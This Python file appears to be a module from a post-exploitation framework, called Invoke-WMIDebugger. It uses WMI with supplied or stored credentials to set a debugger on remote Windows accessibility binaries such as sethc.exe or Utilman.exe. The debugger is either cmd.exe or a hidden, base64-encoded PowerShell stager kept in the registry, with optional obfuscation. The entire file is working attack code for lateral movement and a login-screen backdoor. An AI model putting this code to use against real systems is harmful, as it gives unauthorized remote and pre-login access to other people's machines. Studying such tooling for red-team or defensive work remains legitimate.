from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-WMIDebugger',

            'Author': ['@harmj0y'],

            'Description': ('Uses WMI to set the debugger for a target binary on a remote '
                            'machine to be cmd.exe or a stager.'),

            'Background' : False,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : False,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': []
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'CredID' : {
                'Description'   :   'CredID from the store to use.',
                'Required'      :   False,
                'Value'         :   ''                
            },
            'ComputerName' : {
                'Description'   :   'Host[s] to execute the stager on, comma separated.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'UserName' : {
                'Description'   :   '[domain\]username to use to execute command.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Password' : {
                'Description'   :   'Password to use to execute command.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'TargetBinary' : {
                'Description'   :   'Target binary to set the debugger for (sethc.exe, Utilman.exe, osk.exe, Narrator.exe, or Magnify.exe)',
                'Required'      :   True,
                'Value'         :   'sethc.exe'
            },
            'RegPath' : {
                'Description'   :   'Registry location to store the script code. Last element is the key name.',
                'Required'      :   False,
                'Value'         :   'HKLM:Software\Microsoft\Network\debug'
            },
            'Binary' : {
                'Description'   :   'Binary to set for the debugger.',
                'Required'      :   False,
                'Value'         :   'C:\Windows\System32\cmd.exe'
            },
            'Cleanup' : {
                'Description'   :   'Switch. Disable the debugger for the specified TargetBinary.',
                'Required'      :   False,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
        
        script = """$null = Invoke-WmiMethod -Path Win32_process -Name create"""

        # management options
        cleanup = self.options['Cleanup']['Value']        
        binary = self.options['Binary']['Value']
        targetBinary = self.options['TargetBinary']['Value']
        listenerName = self.options['Listener']['Value']
        userName = self.options['UserName']['Value']
        password = self.options['Password']['Value']

        # storage options
        regPath = self.options['RegPath']['Value']

        statusMsg = ""
        locationString = ""

        # if a credential ID is specified, try to parse
        credID = self.options["CredID"]['Value']
        if credID != "":
            
            if not self.mainMenu.credentials.is_credential_valid(credID):
                print helpers.color("[!] CredID is invalid!")
                return ""

            (credID, credType, domainName, userName, password, host, os, sid, notes) = self.mainMenu.credentials.get_credentials(credID)[0]

            if domainName != "":
                self.options["UserName"]['Value'] = str(domainName) + "\\" + str(userName)
            else:
                self.options["UserName"]['Value'] = str(userName)
            if password != "":
                self.options["Password"]['Value'] = passw = password


        if cleanup.lower() == 'true':
            # the registry command to disable the debugger for the target binary
            payloadCode = "Remove-Item 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+targetBinary+"';"
            statusMsg += " to remove the debugger for " + targetBinary

        elif listenerName != '':
            # if there's a listener specified, generate a stager and store it
            if not self.mainMenu.listeners.is_listener_valid(listenerName):
                # not a valid listener, return nothing for the script
                print helpers.color("[!] Invalid listener: " + listenerName)
                return ""

            else:
                # generate the PowerShell one-liner with all of the proper options set
                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True)
                
                encScript = launcher.split(" ")[-1]
                # statusMsg += "using listener " + listenerName

            path = "\\".join(regPath.split("\\")[0:-1])
            name = regPath.split("\\")[-1]

            # statusMsg += " stored in " + regPath + "."

            payloadCode = "$RegPath = '"+regPath+"';"
            payloadCode += "$parts = $RegPath.split('\\');"
            payloadCode += "$path = $RegPath.split(\"\\\")[0..($parts.count -2)] -join '\\';"
            payloadCode += "$name = $parts[-1];"
            payloadCode += "$null=Set-ItemProperty -Force -Path $path -Name $name -Value "+encScript+";"

            # note where the script is stored
            locationString = "$((gp "+path+" "+name+")."+name+")"

            payloadCode += "$null=New-Item -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+targetBinary+"';$null=Set-ItemProperty -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+targetBinary+"' -Name Debugger -Value '\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c \"$x="+locationString+";start -Win Hidden -A \\\"-enc $x\\\" powershell\";exit;';"

            statusMsg += " to set the debugger for "+targetBinary+" to be a stager for listener " + listenerName + "."

        else:
            payloadCode = "$null=New-Item -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+targetBinary+"';$null=Set-ItemProperty -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+targetBinary+"' -Name Debugger -Value '"+binary+"';"
            
            statusMsg += " to set the debugger for "+targetBinary+" to be " + binary + "."

        # unicode-base64 the payload code to execute on the targets with -enc
        encPayload = helpers.enc_powershell(payloadCode)

        # build the WMI execution string
        computerNames = "\"" + "\",\"".join(self.options['ComputerName']['Value'].split(",")) + "\""

        script += " -ComputerName @("+computerNames+")"
        script += " -ArgumentList \"C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -enc " + encPayload + "\""

        # if we're supplying alternate user credentials
        if userName != '':
            script = "$PSPassword = \""+password+"\" | ConvertTo-SecureString -asPlainText -Force;$Credential = New-Object System.Management.Automation.PSCredential(\""+userName+"\",$PSPassword);" + script + " -Credential $Credential"

        script += ";'Invoke-Wmi executed on " +computerNames + statusMsg+"'"
        if obfuscate:
            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
        return script

